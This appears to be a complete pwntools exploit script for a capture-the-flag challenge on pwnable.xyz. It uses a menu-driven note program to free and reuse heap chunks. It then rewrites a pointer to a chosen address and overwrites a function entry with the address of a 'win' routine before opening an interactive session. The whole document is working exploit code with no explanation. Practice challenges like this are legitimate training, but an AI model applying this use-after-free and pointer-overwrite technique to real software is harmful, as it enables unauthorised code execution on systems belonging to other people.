from pwn import *

def create_notes(num):
    sh.sendlineafter('> ', '1')
    sh.sendlineafter(': ', str(num))

def select_note(num):
    sh.sendlineafter('> ', '2')
    sh.sendlineafter(': ', str(num))

def edit_note(msg):
    sh.sendlineafter('> ', '3')
    sh.sendlineafter(': ', msg)

def delete_note():
    sh.sendlineafter('> ', '4')

#sh = process('./challenge')
sh = remote('svc.pwnable.xyz', 30046)
addr = 0x602020
win = 0x400dd9



create_notes(120)

select_note(112)

delete_note()

select_note(113)

delete_note()

select_note(113)
pause()
edit_note(p64(0x602298))
pause()
create_notes(2)
pause()

select_note(120)

payload = p64(0x0)*0x5 + p64(addr)
pause()
edit_note(payload)
pause()
select_note(0)
edit_note(p64(win))
sh.interactive()
